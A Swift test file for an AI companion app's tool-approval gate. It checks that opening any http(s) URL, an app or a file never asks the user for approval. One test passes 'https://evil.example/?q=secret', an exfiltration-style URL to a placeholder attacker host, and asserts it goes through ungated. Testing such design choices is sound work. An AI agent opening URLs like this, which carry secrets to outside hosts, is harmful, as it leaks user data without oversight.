import CompanionCore
import CompanionTestKit
import Foundation
import Testing

// open_url no pide hoja para ninguna URL http(s), la haya dicho o no la usuaria:
// abrir es navegar. Lo que la pagina envia, paga o borra se juzga aparte.
@Test @MainActor func parentToolGateTests() {
    testOpeningAnHTTPAddressNeverAsks()
    testOtherToolsAreNeverGated()
}

private func call(_ url: String) -> ToolCallRef {
    ToolCallRef(id: "c1", name: "open_url", arguments: "{\"url\":\"\(url)\"}")
}

@MainActor func testOpeningAnHTTPAddressNeverAsks() {
    expect(ParentToolGate.approval(for: call("https://www.google.com/search?q=clima"), said: "busca en Safari el clima de mañana") == nil,
           "busqueda no dicha: sin hoja")
    expect(ParentToolGate.approval(for: call("https://evil.example/?q=secret"), said: "resume esto") == nil,
           "host ajeno: sin hoja")
    expect(ParentToolGate.approval(for: call("https://github.com/x/y"), said: "abre github") == nil, "host dicho: sin hoja")
    expect(ParentToolGate.approval(for: call("not a url"), said: "abre not a url") == nil,
           "lo que no es URL lo rechaza la politica, no la puerta")
}

@MainActor func testOtherToolsAreNeverGated() {
    let app = ToolCallRef(id: "c", name: "open_app", arguments: #"{"name":"Safari"}"#)
    let file = ToolCallRef(id: "c", name: "open_file", arguments: #"{"path":"~/x.md"}"#)
    expect(ParentToolGate.approval(for: app, said: "resume esto") == nil, "otras: open_app no tiene puerta")
    expect(ParentToolGate.approval(for: file, said: "resume esto") == nil, "otras: open_file no tiene puerta")
}
